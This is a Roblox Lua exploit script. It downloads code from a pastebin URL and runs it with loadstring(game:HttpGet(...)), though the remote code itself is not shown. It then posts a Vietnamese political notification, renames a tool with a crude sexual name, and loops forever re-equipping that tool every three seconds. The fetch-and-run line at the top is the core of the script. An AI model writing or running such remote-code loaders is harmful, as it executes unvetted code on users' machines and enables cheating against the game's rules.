local success, err = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
end)

if success then
    game.StarterGui:SetCore("SendNotification", {
        Title = "Thông báo",
        Text = "Hoàng Sa và Trường Sa là của Việt Nam!",
        Duration = 10
    })

    local player = game.Players.LocalPlayer
    local backpack = player:WaitForChild("Backpack")
    local character = player.Character or player.CharacterAdded:Wait()

    -- Đổi tên tool từ "jerk off" thành "sục"
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and string.lower(tool.Name) == "jerk off" then
            tool.Name = "sục"
        end
    end

    -- Hàm loop mỗi 3 giây để bỏ cầm và cầm lại tool "sục"
    task.spawn(function()
        while true do
            task.wait(3)

            character = player.Character or player.CharacterAdded:Wait()
            local tool = character:FindFirstChild("sục")

            if tool and tool:IsA("Tool") then
                tool.Parent = backpack
                task.wait(0.1)
                tool.Parent = character
            end
        end
    end)
end
